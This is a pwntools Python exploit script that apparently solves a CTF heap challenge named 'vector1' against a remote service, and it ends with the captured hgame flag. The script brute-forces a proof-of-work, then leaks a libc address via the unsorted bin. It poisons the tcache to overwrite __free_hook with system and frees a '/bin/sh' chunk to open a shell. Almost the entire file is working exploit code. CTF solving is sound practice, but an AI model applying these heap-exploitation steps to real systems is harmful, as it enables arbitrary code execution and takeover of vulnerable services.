#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = 'vector1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 0
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')

def eat():
    p.recvuntil('1. add\n')
    p.recvuntil('2. edit\n')
    p.recvuntil('3. show\n')
    p.recvuntil('4. delete\n')
    p.recvuntil('5. move note\n')
    p.recvuntil('6. farewell\n')
    p.recvuntil('>> ')

def create(index, size, content):
    eat()
    p.sendline('1')
    p.recvuntil('>> ')
    p.sendline(str(index))
    p.recvuntil('>> ')
    p.sendline(str(size))
    p.recvuntil('>> ')
    p.send(content)

def show(index):
    eat()
    p.sendline('3')
    p.sendline(str(index))

def delete(index):
    eat()
    p.sendline('4')
    p.sendline(str(index))

def move_index_to(index):
    p.recvuntil('which index you want move to?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))

def move_0():
    p.recvuntil('is this one your want to move? [1/0]\n')
    p.recvuntil('>> ')
    p.sendline(str(0))

def move_1():
    p.recvuntil('is this one your want to move? [1/0]\n')
    p.recvuntil('>> ')
    p.sendline(str(1))

def debug():
    gdb.attach(p)
    pause()

bps = [0x1628]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


if local == 0:
    from pwn import *
    from pwnlib.util.iters import mbruteforce
    import itertools
    import base64
    p.recvuntil(') == ')
    hash_code = p.recvuntil('\n', drop=True).decode().strip()
    log.success('hash_code={},'.format(hash_code))
    charset = string.printable
    proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')
    p.sendlineafter('????> ', proof)

# 0x20,0x20,0x30,0x50,0x90,0x110
for i in range(0,6+1):
    create(i,0x68,'index1')

for i in range(0,6+1):
    delete(i)

for i in range(0,6+1):
    create(i,0x98,'index1')

create(7,0x98,'bbbbbbbb')

for i in range(0,6+1):
    delete(i)



# 7->9
p.recvuntil('6. farewell\n')
p.recvuntil('>> ')
p.sendline('5')

p.recvuntil('bbbbbbbb\n')
move_1()
move_index_to(9)

create(8,0x30,'useful')

delete(7)
gdba()
show(9)

unsortedbin_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('unsortedbin_addr: ' + hex(unsortedbin_addr))
libc.address = unsortedbin_addr - 0x1ebbe0# 计算出libc基址 0x7ffff7dd1b78 - 0x7ffff7a0d000
log.success('libc_addr: ' + hex(libc.address))

one_gadget = [0xe6c7e,0xe6c81,0xe6c84]
one_addr = libc.address + one_gadget[2]
log.success('one_addr: ' + hex(one_addr))

__free_hook_addr = libc.address + 0x1eeb28
log.success('__free_hook_addr: ' + hex(__free_hook_addr))

system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))

for i in range(0,6+1):
    create(i,0x68,'index1')

for i in range(10,14+1):
    create(i,0x68,'index1')

create(15,0x68,'cccccccccc')# 15->17

for i in range(0,6+1):
    delete(i)


p.recvuntil('6. farewell\n')
p.recvuntil('>> ')
p.sendline('5')

for i in range(7):
    move_0()

move_1()
move_index_to(17)

delete(15)
delete(14)
delete(17)

for i in range(0,6+1):
    create(i,0x68,'index1')

create(17,0x68,p64(__free_hook_addr))# 15->17

create(18,0x68,'/bin/sh\x00')# 15->17
create(19,0x68,p64(__free_hook_addr))# 15->17
create(20,0x68,p64(system_addr))# 15->17

delete(18)

p.interactive()
# hgame{cPlU5PLus-H4S~5OmE-D@nGeroU5~TrAPs}
